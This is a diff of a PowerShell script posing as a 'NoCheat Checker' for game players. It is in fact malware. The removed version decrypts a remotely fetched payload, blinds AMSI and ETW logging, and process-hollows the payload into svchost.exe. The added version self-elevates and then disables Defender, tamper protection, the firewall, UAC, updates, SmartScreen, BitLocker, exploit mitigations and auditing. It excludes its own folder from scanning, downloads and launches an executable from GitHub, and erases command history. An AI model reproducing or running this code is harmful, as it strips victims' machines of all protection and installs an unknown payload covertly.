@@ -1,93 +1,233 @@
-$ErrorActionPreference = "Stop"
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$ErrorActionPreference = "Continue"
 function Clear-PSHistory {
     Clear-History -ErrorAction SilentlyContinue
     try {
         $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
-        if ($historyPath -and (Test-Path $historyPath)) { Clear-Content -Path $historyPath -ErrorAction SilentlyContinue }
+        if ($historyPath -and (Test-Path $historyPath)) {
+            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
+        }
     } catch {}
 }
-if (-not $isAdmin) {
-    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
-    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
-    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
-    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
-    Clear-PSHistory
-    exit
+function Check-Admin {
+    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+        Write-Host "The script is not running as an administrator. Restart with elevated rights..." -ForegroundColor Red
+        $scriptPath = $MyInvocation.MyCommand.Definition
+        if ([string]::IsNullOrWhiteSpace($scriptPath)) {
+            Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1 | iex`""
+        } else {
+            Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
+        }
+        Clear-PSHistory
+        exit
+    }
+    Write-Host "The script is running as an administrator. Continuation of the execution..." -ForegroundColor Green
 }
+function Disable-TamperProtection {
+    $tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
+    try {
+        if (-not (Test-Path $tamperPath)) { New-Item -Path $tamperPath -Force | Out-Null }
+        Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -PropertyType DWord -Force
+    } catch {}
+}
+function Disable-WindowsUpdate {
+    try {
+        $updatePath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"
+        if (-not (Test-Path $updatePath)) { New-Item -Path $updatePath -Force | Out-Null }
+        Set-ItemProperty -Path $updatePath -Name "NoAutoUpdate" -Value 1 -Type DWord -Force
+        Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
+        Set-Service -Name wuauserv -StartupType Disabled -ErrorAction SilentlyContinue
+    } catch {}
+}
+function Disable-SecurityCenter {
+    try {
+        $securityCenterPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center"
+        if (-not (Test-Path $securityCenterPath)) { New-Item -Path $securityCenterPath -Force | Out-Null }
+        Set-ItemProperty -Path $securityCenterPath -Name "DisableSecurityCenter" -Value 1 -Type DWord -Force
+        Stop-Service -Name SecurityHealthService -Force -ErrorAction SilentlyContinue
+        Set-Service -Name SecurityHealthService -StartupType Disabled -ErrorAction SilentlyContinue
+    } catch {}
+}
+function Disable-AMSI {
+    try {
+        $amsiPath = "HKLM:\SOFTWARE\Microsoft\AMSI"
+        if (-not (Test-Path $amsiPath)) { New-Item -Path $amsiPath -Force | Out-Null }
+        Set-ItemProperty -Path $amsiPath -Name "Disabled" -Value 1 -Type DWord -Force
+    } catch {}
+}
+function Configure-LocalGroupPolicy {
+    try {
+        secedit /export /cfg c:\secpol.cfg
+        (Get-Content c:\secpol.cfg) -replace "DriverLoadPolicy = 3", "DriverLoadPolicy = 0" | Set-Content c:\secpol.cfg
+        secedit /configure /db c:\windows\security\local.sdb /cfg c:\secpol.cfg /areas SECURITYPOLICY
+        Remove-Item c:\secpol.cfg -Force -ErrorAction SilentlyContinue
+        auditpol /set /category:* /success:disable /failure:disable
+    } catch {}
+}
+function Disable-WindowsDefender {
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableAutoExclusions $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+        $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+        if (-not (Test-Path $defenderPath)) { New-Item -Path $defenderPath -Force | Out-Null }
+        Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Type DWord -Force
+    } catch {}
+}
+function Disable-DefenderRegistry {
+    param ([string]$Path, [string]$Name, [int]$Value)
+    try {
+        if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null }
+        if (-not (Get-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue)) {
+            New-ItemProperty -Path $Path -Name $Name -Value $Value -PropertyType DWord -Force | Out-Null
+        } else {
+            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord -Force
+        }
+    } catch {}
+}
+function Disable-WindowsDefender-Reg {
+    try {
+        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
+        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
+        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Security Health\State" -Name "WindowsSecurityHealthState" -Value 0
+        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
+        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1
+        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0
+        Disable-DefenderRegistry -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4
+        Disable-DefenderRegistry -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config\Default" -Name "VulnerableDriverBlocklistEnable" -Value 0
+    } catch {}
+}
+function Disable-SmartScreen {
+    try {
+        $explorerPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
+        if (-not (Test-Path $explorerPath)) { New-Item -Path $explorerPath -Force | Out-Null }
+        Set-ItemProperty -Path $explorerPath -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
+        $edgePath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
+        if (-not (Test-Path $edgePath)) { New-Item -Path $edgePath -Force | Out-Null }
+        Set-ItemProperty -Path $edgePath -Name "SmartScreenEnabled" -Value 0 -Type DWord -Force
+    } catch {}
+}
+function Disable-Firewall {
+    try {
+        Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction SilentlyContinue
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" -Name "EnableFirewall" -Value 0 -Type DWord -Force
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" -Name "EnableFirewall" -Value 0 -Type DWord -Force
+    } catch {}
+}
+function Disable-NetworkProtection {
+    try { Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue } catch {}
+}
+function Disable-CredentialGuard {
+    try { bcdedit /set hypervisorlaunchtype off | Out-Null } catch {}
+}
+function Disable-UAC {
+    try {
+        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Type DWord -Force
+    } catch {}
+}
+function Disable-ControlledFolderAccess {
+    try { Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue } catch {}
+}
+function Disable-BitLocker-App {
+    try {
+        $bitlockerPath = "HKLM:\SOFTWARE\Policies\Microsoft\FVE"
+        if (-not (Test-Path $bitlockerPath)) { New-Item -Path $bitlockerPath -Force | Out-Null }
+        Set-ItemProperty -Path $bitlockerPath -Name "EnableBDE" -Value 0 -Type DWord -Force
+        if ((Get-BitLockerVolume -MountPoint "C:" -ErrorAction SilentlyContinue).VolumeStatus -eq "FullyEncrypted") {
+            Disable-BitLocker -MountPoint "C:" -ErrorAction SilentlyContinue
+        }
+    } catch {}
+}
+function Disable-ATP {
+    try {
+        $atpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection"
+        if (-not (Test-Path $atpPath)) { New-Item -Path $atpPath -Force | Out-Null }
+        Set-ItemProperty -Path $atpPath -Name "ForceDisable" -Value 1 -Type DWord -Force
+    } catch {}
+}
+function Disable-FeaturesViaDISM {
+    $features = @("Windows-Defender-ApplicationGuard","Windows-Defender-Features","Windows-Defender-TamperProtection")
+    foreach ($feature in $features) {
+        try { Disable-WindowsOptionalFeature -Online -FeatureName $feature -NoRestart -ErrorAction SilentlyContinue | Out-Null } catch {}
+    }
+}
+function Disable-SecurityServices {
+    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService")
+    foreach ($service in $services) {
+        try { Stop-Service -Name $service -Force -ErrorAction SilentlyContinue; Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
+    }
+}
+function Disable-ExploitGuard {
+    try { Set-ProcessMitigation -System -Disable CFG, DEP, SEHOP, ForceRelocateImages, BottomUp, HighEntropy, StrictHandle, BlockDynamicCode, DisableWin32kSystemCalls, AuditSystemCall -ErrorAction SilentlyContinue } catch {}
+}
+function ChangeGroupPolicy {
+    try {
+        $executionPolicy = "Bypass"
+        $machinePolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
+        $userPolicyPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
+        if (-not (Test-Path $machinePolicyPath)) { New-Item -Path $machinePolicyPath -Force | Out-Null }
+        Set-ItemProperty -Path $machinePolicyPath -Name "ExecutionPolicy" -Value $executionPolicy -Force
+        if (-not (Test-Path $userPolicyPath)) { New-Item -Path $userPolicyPath -Force | Out-Null }
+        Set-ItemProperty -Path $userPolicyPath -Name "ExecutionPolicy" -Value $executionPolicy -Force
+        Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy $executionPolicy -Force -ErrorAction SilentlyContinue
+        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy $executionPolicy -Force -ErrorAction SilentlyContinue
+        Set-ExecutionPolicy -Scope Process -ExecutionPolicy $executionPolicy -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+Check-Admin
+Disable-TamperProtection
+Disable-SecurityServices
+Disable-WindowsDefender
+Disable-WindowsDefender-Reg
+Disable-SecurityCenter
+Disable-WindowsUpdate
+Disable-Firewall
+Disable-CredentialGuard
+Disable-UAC
+Disable-SmartScreen
+Disable-ExploitGuard
+Disable-ControlledFolderAccess
+Disable-NetworkProtection
+Disable-ATP
+Disable-FeaturesViaDISM
+Disable-BitLocker-App
+Configure-LocalGroupPolicy
+Disable-AMSI
+ChangeGroupPolicy
 Write-Host "==========================================" -ForegroundColor Yellow
 Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
 Write-Host "==========================================" -ForegroundColor Yellow
+$repoOwner  = "die4mebaby"
+$repoName   = "CheatChecker"
+$branch     = "main"
+$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
+$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
+$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
+if (-not (Test-Path $workDir)) {
+    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+}
+$exePath = Join-Path $workDir "nocheat.checker.exe"
 try {
-    $a=[psobject].Assembly.GetType("System.Management.Automation.AmsiUtils")
-    if($a){$f=$a.GetField("amsiInitFailed",[Reflection.BindingFlags]"NonPublic,Static");if($f){$f.SetValue($null,$true)}}
-} catch {}
-try {
-    $e=[psobject].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
-    if($e){$ef=$e.GetField("etwProvider",[Reflection.BindingFlags]"NonPublic,Static");if($ef){$p=$ef.GetValue($null);if($p){$m=$p.GetType().GetField("m_enabled",[Reflection.BindingFlags]"NonPublic,Instance");if($m){$m.SetValue($p,0)}}}}
-} catch {}
-$t_start=Get-Date;Start-Sleep -Milliseconds 150;if(((Get-Date)-$t_start).TotalMilliseconds -lt 100){return}
-$keyB64="gu2koIlU7CZc/688IiTjF7zHemZgBINLWrnhn2LBpk4="
-$ivB64="ZIdLvAC84tJ3L5hxoOLCGw=="
-$encUrl="https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat.checker.enc.b64"
-try {
+    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
+        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
+    }
     Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
-    $wc=New-Object System.Net.WebClient
-    $encB64=$wc.DownloadString($encUrl)
-    $aes=[System.Security.Cryptography.Aes]::Create()
-    $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7
-    $aes.Key=[Convert]::FromBase64String($keyB64)
-    $aes.IV=[Convert]::FromBase64String($ivB64)
-    $encBytes=[Convert]::FromBase64String($encB64)
-    $decBytes=$aes.CreateDecryptor().TransformFinalBlock($encBytes,0,$encBytes.Length)
-    $ms=New-Object System.IO.MemoryStream(,$decBytes)
-    $ds=New-Object System.IO.Compression.DeflateStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
-    $msOut=New-Object System.IO.MemoryStream
-    $ds.CopyTo($msOut)
-    $payloadBytes=$msOut.ToArray()
-    $code=@'
-using System;
-using System.Runtime.InteropServices;
-public class PE {
- [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
- [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,uint s,uint p,out uint o);
- [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr b,IntPtr c,uint d,out uint e);
- [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h,uint m);
- [DllImport("kernel32.dll",SetLastError=true)] public static extern bool WriteProcessMemory(IntPtr h,IntPtr b,byte[] buf,uint s,out UIntPtr w);
- [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($exeUrl, $exePath)
+    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
+        Write-Warning "[!] Чекер не загрузился или файл пустой."
+    } else {
+        Write-Host "[+] Запуск чекера..." -ForegroundColor Green
+        Start-Process -FilePath $exePath -WorkingDirectory $workDir
+    }
 }
-'@
-    Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
-    $code2=@'
-using System;
-using System.Runtime.InteropServices;
-public class RunPE {
- [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)] public static extern bool CreateProcessA(string a,string b,IntPtr c,IntPtr d,bool e,uint f,IntPtr g,string h,ref STARTUPINFO i,out PROCESS_INFORMATION j);
- [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h,IntPtr b);
- [DllImport("kernel32.dll")] public static extern bool GetThreadContext(IntPtr h,IntPtr c);
- [DllImport("kernel32.dll")] public static extern bool SetThreadContext(IntPtr h,IntPtr c);
- [DllImport("kernel32.dll")] public static extern bool ResumeThread(IntPtr h);
- [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Ansi)] public struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
- [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
-}
-'@
-    Add-Type -TypeDefinition $code2 -ErrorAction SilentlyContinue
-    $si=New-Object RunPE+STARTUPINFO
-    $si.cb=[Runtime.InteropServices.Marshal]::SizeOf($si)
-    $pi=New-Object RunPE+PROCESS_INFORMATION
-    $path=$env:SystemRoot+"\System32\svchost.exe"
-    $created=[RunPE]::CreateProcessA($path,$null,[IntPtr]::Zero,[IntPtr]::Zero,$false,4,[IntPtr]::Zero,$null,[ref]$si,[ref]$pi)
-    if(-not $created){throw "CreateProcess failed"}
-    $base=[PE]::VirtualAlloc([IntPtr]::Zero,[uint32]$payloadBytes.Length,0x3000,0x40)
-    $written=[UIntPtr]::Zero
-    [PE]::WriteProcessMemory($pi.hProcess,$base,$payloadBytes,[uint32]$payloadBytes.Length,[ref]$written) | Out-Null
-    [RunPE]::NtUnmapViewOfSection($pi.hProcess,[IntPtr]0x400000) | Out-Null
-    [PE]::WriteProcessMemory($pi.hProcess,[IntPtr]0x400000,$payloadBytes,[uint32]$payloadBytes.Length,[ref]$written) | Out-Null
-    [RunPE]::ResumeThread($pi.hThread) | Out-Null
-    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
-} catch {
-    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
+catch {
+    Write-Host "[-] Ошибка выполнения NoCheat блока: $($_.Exception.Message)" -ForegroundColor Red
 }
 Clear-PSHistory
-exit
